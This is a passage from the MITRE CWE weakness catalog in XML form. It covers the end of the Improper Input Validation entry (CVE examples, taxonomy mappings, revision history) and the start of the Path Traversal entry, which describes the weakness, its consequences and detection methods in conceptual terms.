            <Link>https://www.cve.org/CVERecord?id=CVE-2021-37147</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5305</Reference>
               <Description>Eval injection in Perl program using an ID that should only contain hyphens and numbers.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5305</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2223</Reference>
               <Description>SQL injection through an ID that was supposed to be numeric.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2223</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3477</Reference>
               <Description>lack of input validation in spreadsheet program leads to buffer overflows, integer overflows, array index errors, and memory corruption.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3477</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3843</Reference>
               <Description>insufficient validation enables XSS</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3843</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3174</Reference>
               <Description>driver in security product allows code execution due to insufficient validation</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3174</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3409</Reference>
               <Description>infinite loop from DNS packet with a label that points to itself</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3409</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6870</Reference>
               <Description>infinite loop from DNS packet with a label that points to itself</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6870</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1303</Reference>
               <Description>missing parameter leads to crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1303</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5893</Reference>
               <Description>HTTP request with missing protocol version number leads to crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5893</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-6658</Reference>
               <Description>request with missing parameters leads to information exposure</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-6658</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4114</Reference>
               <Description>system crash with offset value that is inconsistent with packet size</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4114</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-3790</Reference>
               <Description>size field that is inconsistent with packet size leads to buffer over-read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-3790</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2309</Reference>
               <Description>product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2309</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3494</Reference>
               <Description>security bypass via an extra header</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3494</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3571</Reference>
               <Description>empty packet triggers reboot</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3571</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-5525</Reference>
               <Description>incomplete denylist allows SQL injection</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-5525</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1284</Reference>
               <Description>NUL byte in theme name causes directory traversal impact to be worse</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1284</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-0600</Reference>
               <Description>kernel does not validate an incoming pointer before dereferencing it</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-0600</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1738</Reference>
               <Description>anti-virus product has insufficient input validation of hooked SSDT functions, allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1738</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1737</Reference>
               <Description>anti-virus product allows DoS via zero-length field</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1737</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3464</Reference>
               <Description>driver does not validate input from userland to the kernel</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3464</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2252</Reference>
               <Description>kernel does not validate parameters sent in from userland, allowing code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2252</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-2374</Reference>
               <Description>lack of validation of string length fields allows memory consumption or buffer over-read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2374</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1440</Reference>
               <Description>lack of validation of length field leads to infinite loop</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1440</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-1625</Reference>
               <Description>lack of validation of input to an IOCTL allows code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-1625</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3177</Reference>
               <Description>zero-length attachment causes crash</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3177</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-2442</Reference>
               <Description>zero-length input causes free of uninitialized pointer</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-2442</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5563</Reference>
               <Description>crash via a malformed frame structure</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5563</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-5285</Reference>
               <Description>infinite loop from a long SMTP request</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-5285</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3812</Reference>
               <Description>router crashes with a malformed packet</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3812</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3680</Reference>
               <Description>packet with invalid version number leads to NULL pointer dereference</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3680</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3660</Reference>
               <Description>crash via multiple "." characters in file extension</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3660</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="7 Pernicious Kingdoms">
               <Entry_Name>Input validation and representation</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A1</Entry_ID>
               <Entry_Name>Unvalidated Input</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ERR07-C</Entry_ID>
               <Entry_Name>Prefer functions that support error checking over equivalent functions that don't</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO30-C</Entry_ID>
               <Entry_Name>Exclude user input from format strings</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MEM10-C</Entry_ID>
               <Entry_Name>Define and use a pointer validation function</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>20</Entry_ID>
               <Entry_Name>Improper Input Handling</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP25</Entry_ID>
               <Entry_Name>Tainted input to variable</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="101"/>
            <Related_Attack_Pattern CAPEC_ID="104"/>
            <Related_Attack_Pattern CAPEC_ID="108"/>
            <Related_Attack_Pattern CAPEC_ID="109"/>
            <Related_Attack_Pattern CAPEC_ID="110"/>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="13"/>
            <Related_Attack_Pattern CAPEC_ID="135"/>
            <Related_Attack_Pattern CAPEC_ID="136"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="153"/>
            <Related_Attack_Pattern CAPEC_ID="182"/>
            <Related_Attack_Pattern CAPEC_ID="209"/>
            <Related_Attack_Pattern CAPEC_ID="22"/>
            <Related_Attack_Pattern CAPEC_ID="23"/>
            <Related_Attack_Pattern CAPEC_ID="230"/>
            <Related_Attack_Pattern CAPEC_ID="231"/>
            <Related_Attack_Pattern CAPEC_ID="24"/>
            <Related_Attack_Pattern CAPEC_ID="250"/>
            <Related_Attack_Pattern CAPEC_ID="261"/>
            <Related_Attack_Pattern CAPEC_ID="267"/>
            <Related_Attack_Pattern CAPEC_ID="28"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="31"/>
            <Related_Attack_Pattern CAPEC_ID="42"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="46"/>
            <Related_Attack_Pattern CAPEC_ID="47"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="52"/>
            <Related_Attack_Pattern CAPEC_ID="53"/>
            <Related_Attack_Pattern CAPEC_ID="588"/>
            <Related_Attack_Pattern CAPEC_ID="63"/>
            <Related_Attack_Pattern CAPEC_ID="64"/>
            <Related_Attack_Pattern CAPEC_ID="664"/>
            <Related_Attack_Pattern CAPEC_ID="67"/>
            <Related_Attack_Pattern CAPEC_ID="7"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
            <Related_Attack_Pattern CAPEC_ID="72"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="78"/>
            <Related_Attack_Pattern CAPEC_ID="79"/>
            <Related_Attack_Pattern CAPEC_ID="8"/>
            <Related_Attack_Pattern CAPEC_ID="80"/>
            <Related_Attack_Pattern CAPEC_ID="81"/>
            <Related_Attack_Pattern CAPEC_ID="83"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
            <Related_Attack_Pattern CAPEC_ID="88"/>
            <Related_Attack_Pattern CAPEC_ID="9"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-6"/>
            <Reference External_Reference_ID="REF-166"/>
            <Reference External_Reference_ID="REF-45"/>
            <Reference External_Reference_ID="REF-168" Section="Input Validation Attacks"/>
            <Reference External_Reference_ID="REF-48"/>
            <Reference External_Reference_ID="REF-170"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 10, &#34;All Input Is Evil!&#34; Page 341"/>
            <Reference External_Reference_ID="REF-1109"/>
            <Reference External_Reference_ID="REF-1110"/>
            <Reference External_Reference_ID="REF-1111"/>
            <Reference External_Reference_ID="REF-1287" Section="Details of Problematic Mappings"/>
         </References>
         <Mapping_Notes>
            <Usage>Discouraged</Usage>
            <Rationale>CWE-20 is commonly misused in low-information vulnerability reports when lower-level CWEs could be used instead, or when more details about the vulnerability are available [REF-1287]. It is not useful for trend analysis. It is also a level-1 Class (i.e., a child of a Pillar).</Rationale>
            <Comments>Consider lower-level children such as Improper Use of Validation Framework (CWE-1173) or improper validation involving specific types or properties of input such as Specified Quantity (CWE-1284); Specified Index, Position, or Offset (CWE-1285); Syntactic Correctness (CWE-1286); Specified Type (CWE-1287); Consistency within Input (CWE-1288); or Unsafe Equivalence (CWE-1289).</Comments>
            <Reasons>
               <Reason Type="Frequent Misuse"/>
            </Reasons>
			<Suggestions>
			  <Suggestion CWE_ID="1284" Comment="Specified Quantity"/>
			  <Suggestion CWE_ID="1285" Comment="Specified Index, Position, or Offset"/>
			  <Suggestion CWE_ID="1286" Comment="Syntactic Correctness"/>
			  <Suggestion CWE_ID="1287" Comment="Specified Type"/>
			  <Suggestion CWE_ID="1288" Comment="Consistency within Input"/>
			  <Suggestion CWE_ID="1289" Comment="Unsafe Equivalence"/>
			  <Suggestion CWE_ID="116" Comment="Improper Encoding or Escaping of Output"/>
			</Suggestions>
         </Mapping_Notes>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>CWE-116 and CWE-20 have a close association because, depending on the nature of the structured message, proper input validation can indirectly prevent special characters from changing the meaning of a structured message. For example, by validating that a numeric ID field should only contain the 0-9 characters, the programmer effectively prevents injection attacks.</xhtml:p>
            </Note>
            <Note Type="Maintenance">As of 2020, this entry is used more often than preferred, and it is a source of frequent confusion. It is being actively modified for CWE 4.1 and subsequent versions.</Note>
            <Note Type="Maintenance">Concepts such as validation, data transformation, and neutralization are being refined, so relationships between CWE-20 and other entries such as CWE-707 may change in future versions, along with an update to the Vulnerability Theory document.</Note>
            <Note Type="Maintenance">Input validation - whether missing or incorrect - is such an essential and widespread part of secure development that it is implicit in many different weaknesses. Traditionally, problems such as buffer overflows and XSS have been classified as input validation problems by many security professionals. However, input validation is not necessarily the only protection mechanism available for avoiding such problems, and in some cases it is not even sufficient. The CWE team has begun capturing these subtleties in chains within the Research Concepts view (CWE-1000), but more work is needed.</Note>
            <Note Type="Terminology">
               <xhtml:p>The "input validation" term is extremely common, but it is used in many different ways. In some cases its usage can obscure the real underlying weakness or otherwise hide chaining and composite relationships.</xhtml:p>
               <xhtml:p>Some people use "input validation" as a general term that covers many different neutralization techniques for ensuring that input is appropriate, such as filtering, canonicalization, and escaping. Others use the term in a more narrow context to simply mean "checking if an input conforms to expectations without changing it."  CWE uses this more narrow interpretation.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>7 Pernicious Kingdoms</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
               <Submission_Version>Draft 3</Submission_Version>
               <Submission_ReleaseDate>2006-07-19</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Relationships, Other_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Likelihood_of_Exploit, Name, Observed_Examples, Other_Notes, Potential_Mitigations, References, Relationship_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Detection_Factors</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Research_Gaps, Terminology_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Common_Consequences, Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-09-19</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, References, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Demonstrative_Examples, Description, Maintenance_Notes, Observed_Examples, Potential_Mitigations, References, Relationship_Notes, Relationships, Research_Gaps, Terminology_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-08-20</Modification_Date>
					<Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-03-15</Modification_Date>
					<Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-07-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-06-28</Modification_Date>
					<Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Insufficient Input Validation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="22" Name="Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')" Abstraction="Base" Structure="Simple" Status="Stable">
         <Description>The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory.</Description>
         <Extended_Description>
            <xhtml:p>Many file operations are intended to take place within a restricted directory. By using special elements such as ".." and "/" separators, attackers can escape outside of the restricted location to access files or directories that are elsewhere on the system. One of the most common special elements is the "../" sequence, which in most modern operating systems is interpreted as the parent directory of the current location. This is referred to as relative path traversal. Path traversal also covers the use of absolute pathnames such as "/usr/local/bin", which may also be useful in accessing unexpected files. This is referred to as absolute path traversal.</xhtml:p>
            <xhtml:p>In many programming languages, the injection of a null byte (the 0 or NUL) may allow an attacker to truncate a generated filename to widen the scope of attack. For example, the product may add ".txt" to any pathname, thus limiting the attacker to text files, but a null injection may effectively remove this restriction.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="706" View_ID="1003" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="668" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
            <Weakness_Ordinality>
               <Ordinality>Resultant</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Directory traversal</Term>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Path traversal</Term>
               <Description>"Path traversal" is preferred over "directory traversal," but both terms are attack-focused.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>The attacker may be able to create or overwrite critical files that are used to execute code, such as programs or libraries.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Files or Directories</Impact>
               <Note>The attacker may be able to overwrite or create critical files, such as programs, libraries, or important data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, appending a new account at the end of a password file may allow an attacker to bypass authentication.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Files or Directories</Impact>
               <Note>The attacker may be able read the contents of unexpected files and expose sensitive data. If the targeted file is used for a security mechanism, then the attacker may be able to bypass that mechanism. For example, by reading a password file, the attacker could conduct brute force password guessing attacks in order to break into an account on the system.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Note>The attacker may be able to overwrite, delete, or corrupt unexpected critical files such as programs, libraries, or important data. This may prevent the product from working at all and in the case of a protection mechanisms such as authentication, it has the potential to lockout every user of the product.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>Automated techniques can find areas where path traversal weaknesses exist. However, tuning or customization may be required to remove or de-prioritize path-traversal problems that are only exploitable by the product's administrator - or other privileged users - and thus potentially valid behavior or, at worst, a bug instead of a vulnerability.</Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis</Method>
